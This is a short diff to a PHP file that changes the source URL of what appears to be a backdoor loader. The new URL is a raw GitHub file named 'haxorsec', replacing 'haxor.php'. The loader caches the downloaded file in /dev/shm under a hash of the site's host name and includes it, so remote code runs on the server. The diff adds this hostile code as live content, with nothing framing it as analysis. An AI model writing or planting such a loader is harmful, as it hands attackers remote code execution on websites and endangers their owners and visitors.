@@ -1,5 +1,5 @@
 <?php
-$data = ['https://raw.githubusercontent.com/boyas2/aboyas/refs/heads/main/haxor.php', '/dev/shm/'.md5($_SERVER['HTTP_HOST'])];
+$data = ['https://raw.githubusercontent.com/davinadiandra07/module/refs/heads/main/haxorsec', '/dev/shm/'.md5($_SERVER['HTTP_HOST'])];
 
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
